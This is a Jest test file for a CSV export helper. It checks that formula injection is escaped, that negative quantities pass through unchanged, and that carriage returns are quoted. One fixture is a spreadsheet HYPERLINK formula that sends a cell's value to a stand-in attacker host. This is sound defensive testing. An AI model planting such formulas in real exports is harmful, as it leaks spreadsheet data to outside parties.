/** @jest-environment jsdom */

import { downloadCsvExport } from '../downloadCsvExport'

function captureCsv(
  columns: Array<{ field: string; header: string }>,
  rows: Array<Record<string, unknown>>,
): string {
  let captured = ''
  const originalCreate = URL.createObjectURL
  const originalRevoke = URL.revokeObjectURL
  const originalClick = HTMLAnchorElement.prototype.click

  // jsdom implements neither objectURL nor a real Blob read, so the payload is
  // taken from the Blob the helper hands to createObjectURL.
  URL.createObjectURL = ((blob: Blob) => {
    captured = (blob as unknown as { __parts?: string[] }).__parts?.join('') ?? ''
    return 'blob:stub'
  }) as typeof URL.createObjectURL
  URL.revokeObjectURL = (() => undefined) as typeof URL.revokeObjectURL
  HTMLAnchorElement.prototype.click = function noop() {}

  const OriginalBlob = global.Blob
  global.Blob = class StubBlob {
    __parts: string[]
    constructor(parts: string[]) {
      this.__parts = parts
    }
  } as unknown as typeof Blob

  try {
    downloadCsvExport('export.csv', columns, rows)
  } finally {
    global.Blob = OriginalBlob
    URL.createObjectURL = originalCreate
    URL.revokeObjectURL = originalRevoke
    HTMLAnchorElement.prototype.click = originalClick
  }
  return captured
}

const COLUMNS = [
  { field: 'warehouse', header: 'Warehouse' },
  { field: 'onHand', header: 'On hand' },
]

describe('downloadCsvExport', () => {
  it('neutralizes a formula an operator saved as a warehouse name', () => {
    // A warehouse name is operator-entered free text. Written verbatim into a
    // CSV it executes on open in Excel/LibreOffice/Sheets.
    const csv = captureCsv(COLUMNS, [
      { warehouse: '=HYPERLINK("http://attacker/"&A1,"ok")', onHand: 4 },
    ])

    expect(csv).toContain('\'=HYPERLINK')
    expect(csv).not.toMatch(/(^|,)=HYPERLINK/m)
  })

  it('neutralizes every formula-trigger prefix', () => {
    const csv = captureCsv(COLUMNS, [
      { warehouse: '+1+1', onHand: 0 },
      { warehouse: '-1+1', onHand: 0 },
      { warehouse: '@SUM(1+9)', onHand: 0 },
    ])

    expect(csv).toContain("'+1+1")
    expect(csv).toContain("'-1+1")
    expect(csv).toContain("'@SUM(1+9)")
  })

  it('leaves negative quantities as plain numbers', () => {
    // The regression guard for the fix itself: passing quantities through as
    // strings would prefix every negative with an apostrophe and corrupt the
    // numeric column.
    const csv = captureCsv(COLUMNS, [{ warehouse: 'Main', onHand: -7 }])

    expect(csv).toContain('Main,-7')
    expect(csv).not.toContain("'-7")
  })

  it('quotes values containing a carriage return', () => {
    // The hand-rolled escape this replaced tested only /[",\n]/, so a bare \r
    // broke row alignment for the rest of the file.
    const csv = captureCsv(COLUMNS, [{ warehouse: 'A\rB', onHand: 1 }])

    expect(csv).toContain('"A\rB"')
  })
})
